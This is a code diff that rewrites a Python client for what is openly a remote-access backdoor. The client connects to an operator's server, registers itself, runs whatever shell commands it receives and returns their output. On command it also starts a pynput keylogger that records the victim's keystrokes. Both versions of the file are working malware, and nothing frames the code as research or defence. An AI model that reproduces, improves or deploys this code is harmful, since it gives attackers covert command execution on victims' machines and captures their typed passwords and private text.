@@ -1,172 +1,82 @@
-import os
 import socket
-import threading
+from threading import Timer
+import os
 import subprocess
 from pynput.keyboard import Listener, Key
 
-# change PORT, SERVER down below too
-
 HEADER = 2048
-PORT = your PORT here
+PORT = 0  # Replace 0 With Your Port Number
+SERVER = "localhost"  # Replace localhost With Your Public IP
+clientnum = "client_name"  # Replace client_name With Any Name You Haven't Used Before, No Spaces
 FORMAT = 'utf-8'
-SERVER = "your public IP here dont remove quotes"
 ADDR = (SERVER, PORT)
-result = ""
 kloutput = []
 line = ""
-klenabled = False
-CLIENTnum = "your CLIENTNUMBER here dont remove quotes"
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(ADDR)
+connect = client.connect_ex(ADDR)
 
-try:
-    def kl():
-        global klenabled
-        if klenabled:
-            def on_press(key):
-                global kloutput
-                global line
-                inputs = [Key.space, Key.enter, Key.space]
-                if key in inputs:
-                    if line:
-                        kloutput.append(line)
-                        line = ""
-                    kloutput.append(f"<{key.name}>")
-                elif hasattr(key, "char"):
-                    line += str(key.char)
+
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+    global line
+    global output
+    global kloutput
+
+    if key in "abcdefghijklmnopqrstuvwxyz":
+        line += key
+
+    if key not in "abcdefghijklmnopqrstuvwxyz":
+        if line:
+            kloutput.append(line)
+            line = ""
+        if key:
+            kloutput.append(key)
+        output = "<kl>" + str(kloutput)
+
+
+def send(msg):
+    message = msg.encode(FORMAT)
+    client.send(message)
+
+
+def recieve():
+    recieved = (client.recv(HEADER))
+    result = recieved.decode(FORMAT)
+    return result
+
+
+send(clientnum + "<?CLIENT?>")
+
+while True:
+    command = recieve()
+    cwd = ""
+    output = ""
+    if command:
+        if "cd" in command.split():
+            try:
+                if len(command.split()) == 2:
+                    os.chdir(command.split()[1])
                 else:
-                    line += "<other>"
-                if len(kloutput) == 2:
-                    send("<kl>" + str(kloutput))
-                    kloutput = []
+                    output = os.getcwd()
+            except FileNotFoundError as e:
+                output = e
 
-            with Listener(on_press=on_press) as listener:
-                listener.join()
-
-
-    def send(msg):
-        message = msg.encode(FORMAT)
-        client.send(message)
-
-
-    def recieve():
-        global result
-        global klenabled
-        while True:
-            mes = (client.recv(HEADER))
-            command = mes.decode(FORMAT)
-            splitted_command = command.split(" ")
-            if command:
-                if command not in ["cd", "kl", "kl close", "cmd"]:
-                    result = subprocess.getoutput(command)
-                if splitted_command[0].lower() == "cd":
-                    try:
-                        if len(splitted_command) == 2:
-                            os.chdir(splitted_command[1])
-                        else:
-                            os.chdir(os.getcwd())
-                    except FileNotFoundError as e:
-                        result = str(e)
-                if command == "kl":
-                    klenabled = True
-                    if threading.active_count() == 1:
-                        thread = threading.Thread(target=kl)
-                        thread.start()
-                if command == "kl close":
-                    klenabled = False
-                cwd = os.getcwd()
-                send(cwd + "<sep>" + result)
-
-
-    while True:
-        send("CLIENT:" + CLIENTnum)
-        mes1 = (client.recv(HEADER))
-        mess = mes1.decode(FORMAT)
-        if mess == "connected":
-            break
-    recieve()
-
-except:
-
-# change here too
-
-    HEADER = 2048
-    PORT = your PORT here
-    FORMAT = 'utf-8'
-    SERVER = "your public IP here dont remove quotes"
-    ADDR = (SERVER, PORT)
-    result = ""
-    kloutput = []
-    line = ""
-    klenabled = False
-
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(ADDR)
-
-
-    def kl():
-        global klenabled
-        if klenabled:
-            def on_press(key):
-                global kloutput
-                global line
-                inputs = [Key.space, Key.enter, Key.space]
-                if key in inputs:
-                    if line:
-                        kloutput.append(line)
-                        line = ""
-                    kloutput.append(f"<{key.name}>")
-                elif hasattr(key, "char"):
-                    line += str(key.char)
+        if "kl" in command.split():
+            try:
+                if len(command.split()) == 2:
+                    kl, time = command.split()
+                    time = int(time)
                 else:
-                    line += "<other>"
-                if len(kloutput) == 2:
-                    send("<kl>" + str(kloutput))
-                    kloutput = []
-
-            with Listener(on_press=on_press) as listener:
-                listener.join()
-
-
-    def send(msg):
-        message = msg.encode(FORMAT)
-        client.send(message)
-
-
-    def recieve():
-        global result
-        global klenabled
-        while True:
-            mes = (client.recv(HEADER))
-            command = mes.decode(FORMAT)
-            splitted_command = command.split(" ")
-            if command:
-                if command not in ["cd", "kl", "kl close", "cmd"]:
-                    result = subprocess.getoutput(command)
-                if splitted_command[0].lower() == "cd":
-                    try:
-                        if len(splitted_command) == 2:
-                            os.chdir(splitted_command[1])
-                        else:
-                            os.chdir(os.getcwd())
-                    except FileNotFoundError as e:
-                        result = str(e)
-                if command == "kl":
-                    klenabled = True
-                    if threading.active_count() == 1:
-                        thread = threading.Thread(target=kl)
-                        thread.start()
-                if command == "kl close":
-                    klenabled = False
-                cwd = os.getcwd()
-                send(cwd + "<sep>" + result)
-
-
-    while True:
-        send("CLIENT:" + CLIENTnum)
-        mes1 = (client.recv(HEADER))
-        mess = mes1.decode(FORMAT)
-        if mess == "connected":
-            break
-    recieve()
+                    time = 5
+                with Listener(on_press=log_keystroke) as l:
+                    Timer(time, l.stop).start()
+                    l.join()
+            except ValueError as e:
+                output = e
+        else:
+            output = subprocess.getoutput(command)
+        cwd = os.getcwd()
+        output = str(output)
+        send(clientnum + "<?CLIENT?>" + output + "<sep>" + cwd)
+        output = ""
